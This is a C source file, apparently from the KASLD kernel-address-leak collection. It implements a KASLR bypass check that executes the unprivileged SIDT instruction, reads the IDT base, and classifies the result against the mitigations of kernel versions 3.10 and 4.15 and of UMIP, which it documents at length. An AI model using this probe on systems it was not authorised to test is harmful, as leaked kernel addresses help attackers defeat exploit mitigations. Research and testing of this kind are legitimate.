// This file is part of KASLD - https://github.com/bcoles/kasld
//
// KASLR bypass via unprivileged SIDT instruction (x86/x86_64).
//
// The x86 SIDT (Store Interrupt Descriptor Table Register) instruction is
// unprivileged: any userspace process can execute it to read the IDT
// register, which contains the base virtual address and limit of the
// Interrupt Descriptor Table.
//
// On kernels prior to v3.10 (before commit 4eefbe792bae, 2013-04-11),
// idt_table lived in the kernel BSS/data section. Its virtual address
// revealed the kernel's load offset. However, KASLR for x86_64 was not
// merged until v3.14, so the fixmap IDT mitigation predated KASLR.
// Consequently, SIDT was never a viable KASLR bypass on vanilla upstream
// kernels — it was only practical against out-of-tree KASLR patches on
// kernels older than v3.10.
//
// Timeline of mitigations:
//
//   Kernel v3.10 (2013-06): IDT remapped into the fixmap region at a
//     compile-time constant read-only virtual address. SIDT no longer
//     leaks a KASLR-dependent address. Part of the x86-kaslr prep work
//     by Kees Cook, merged before KASLR itself (v3.14).
//     https://github.com/torvalds/linux/commit/4eefbe792bae
//
//   Kernel v3.14 (2014-03): x86_64 KASLR merged upstream (Kees Cook).
//     IDT already in fixmap, so SIDT was not exploitable.
//
//   Kernel v4.15 (2018-01): KPTI (Kernel Page-Table Isolation) further
//     moved the IDT into the per-CPU entry area at a fixed virtual
//     address (0xfffffe0000000000 + per-CPU offset).
//
// Additionally, CPUs with UMIP (User-Mode Instruction Prevention) trap
// SIDT in ring 3 with a #GP. The kernel catches this and emulates the
// instruction with hardcoded dummy values:
//   IDT base  = 0xffffffffffff0000 (UMIP_DUMMY_IDT_BASE)
//   IDT limit = 0x0000
// (See arch/x86/kernel/umip.c in the kernel source.)
// UMIP is present on Intel Cannon Lake+ (2018) and AMD Zen 2+ (2019).
//
// This component detects four cases:
//   1. IDT in kernel text region  -> KASLR leak (pre-3.10 kernels)
//   2. IDT in fixmap region       -> no leak (3.10+ without KPTI)
//   3. IDT in CPU entry area      -> no leak (4.15+ with KPTI)
//   4. UMIP dummy value           -> no leak (CPU prevents the read)
//
// Leak primitive:
//   Data leaked:      IDT base virtual address
//   Kernel subsystem: arch/x86 — SIDT instruction (unprivileged)
//   Data structure:   IDTR (Interrupt Descriptor Table Register)
//   Address type:     virtual
//   Method:           parsed (CPU instruction)
//   Patched:          v3.10 (commit 4eefbe792bae; IDT moved to fixmap)
//   Status:           fixed in v3.10 (predates KASLR v3.14)
//   Access check:     none (unprivileged CPU instruction); UMIP traps with #GP
//                     on modern CPUs
//   Source:           N/A (CPU SIDT instruction reads IDTR; no kernel
//                     function involved)
//
// Mitigations:
//   IDT moved to fixmap in v3.10 (constant virtual address). KPTI
//   (v4.15) further moves IDT to CPU entry area. UMIP (Intel Cannon
//   Lake+, AMD Zen 2+) traps SIDT in ring 3 with #GP, returning
//   dummy values. Never a viable KASLR bypass on upstream kernels.
//
// References:
//   https://gruss.cc/files/kaiser.pdf ("KASLR is Dead: Long Live KASLR")
//   https://www.ieee-security.org/TC/SP2013/papers/4977a191.pdf
//   https://lwn.net/Articles/741878/
// ---
// <bcoles@gmail.com>

#if !defined(__x86_64__) && !defined(__amd64__) && !defined(__i386__)
#error "Architecture is not supported"
#endif

#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

/* UMIP (User-Mode Instruction Prevention) emulation dummy values.
 * When UMIP is active, the kernel traps SIDT from ring 3 and returns
 * these hardcoded values instead of the real IDT register contents.
 * See arch/x86/kernel/umip.c: UMIP_DUMMY_IDT_BASE, UMIP_DUMMY_GDT_BASE */
#if defined(__x86_64__) || defined(__amd64__)
#define UMIP_DUMMY_IDT_BASE 0xffffffffffff0000UL
#else
#define UMIP_DUMMY_IDT_BASE 0xffff0000UL
#endif

KASLD_EXPLAIN(
    "Executes the unprivileged SIDT instruction to read the Interrupt "
    "Descriptor Table (IDT) base virtual address. Before v3.10, the IDT "
    "lived in the kernel BSS at a fixed offset from the text base. Since "
    "v3.10 (predating KASLR v3.14), the IDT was moved to a per-CPU "
    "fixmap page, making SIDT return a constant address. Intel UMIP "
    "(User-Mode Instruction Prevention) faults on SIDT from ring 3.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:virtual\n"
           "patch:v3.10\n"
           "hardware:UMIP\n");

/* IDTR layout: 2-byte limit followed by base address (4 or 8 bytes) */
struct idtr {
  uint16_t limit;
#if defined(__x86_64__) || defined(__amd64__)
  uint64_t base;
#else
  uint32_t base;
#endif
} __attribute__((packed));

/* x86_64 address ranges */
#if defined(__x86_64__) || defined(__amd64__)

/* CPU entry area: 0xfffffe0000000000 .. 0xfffffe7fffffffff (512 GiB)
 * https://www.kernel.org/doc/html/latest/x86/x86_64/mm.html */
#define CPU_ENTRY_AREA_BASE 0xfffffe0000000000UL
#define CPU_ENTRY_AREA_MASK 0xffffff8000000000UL

/* Fixmap region: sits just above the module area (above MODULES_END =
 * 0xffffffffff000000), below vsyscall (0xffffffffff600000). FIXADDR_TOP
 * is typically 0xffffffffff7ff000. The fixmap grows downward. The IDT
 * fixmap slot sits within this range since v3.10 (commit 4eefbe792bae). */
#define FIXMAP_TOP 0xffffffffff7ff000UL
#define FIXMAP_BOTTOM 0xffffffffff000000UL

static int is_cpu_entry_area(unsigned long addr) {
  return (addr & CPU_ENTRY_AREA_MASK) == CPU_ENTRY_AREA_BASE;
}

static int is_fixmap_region(unsigned long addr) {
  return addr >= FIXMAP_BOTTOM && addr <= FIXMAP_TOP;
}

static int is_kernel_text_region(unsigned long addr) {
  return addr >= KERNEL_VIRT_TEXT_MIN && addr < MODULES_START;
}

#else /* __i386__ */

/* On 32-bit x86, the fixmap region is architecture-dependent but
 * generally sits in the 0xfff00000..0xfffff000 range. The kernel
 * text is typically at 0xc0000000+. */
#define FIXMAP_TOP_32 0xfffff000UL
#define FIXMAP_BOTTOM_32 0xfff00000UL

static int is_cpu_entry_area(unsigned long addr) {
  (void)addr;
  return 0; /* CPU entry area concept is 64-bit KPTI only */
}

static int is_fixmap_region(unsigned long addr) {
  return addr >= FIXMAP_BOTTOM_32 && addr <= FIXMAP_TOP_32;
}

static int is_kernel_text_region(unsigned long addr) {
  return kasld_addr_is_kernel_text(addr);
}

#endif

static unsigned long get_kernel_addr_sidt(void) {
  struct idtr idt;

  kasld_info("trying SIDT leak ...");

  __asm__ volatile("sidt %0" : "=m"(idt));

  unsigned long base = (unsigned long)idt.base;

  kasld_info("IDT base:  0x%016lx", base);
  kasld_info("IDT limit: 0x%04x (%u bytes, %u entries)", idt.limit,
             (unsigned)(idt.limit + 1), (unsigned)((idt.limit + 1) / 16));

  /* UMIP emulation returns a hardcoded dummy base with limit=0 */
  if (base == UMIP_DUMMY_IDT_BASE && idt.limit == 0) {
    kasld_err("UMIP active — kernel returned dummy IDT value, no leak");
    return 0;
  }

  if (is_cpu_entry_area(base)) {
    kasld_err("IDT is in the CPU entry area (CONFIG_PAGE_TABLE_ISOLATION=y) — "
              "no leak");
    return 0;
  }

  if (is_fixmap_region(base)) {
    kasld_err("IDT is in the fixmap region (kernel >= ~3.10) — no leak");
    return 0;
  }

  if (is_kernel_text_region(base)) {
    kasld_found("IDT is in the kernel text region!");
    return base;
  }

  kasld_err("IDT base 0x%lx is not in a recognized kernel region", base);
  return 0;
}

int main(void) {
  unsigned long addr = get_kernel_addr_sidt();

  if (!addr)
    return 0;

  kasld_info("possible kernel base: %lx", kasld_floor_text_base(addr));
  kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, addr, NULL,
                      CONF_PARSED);

  return 0;
}
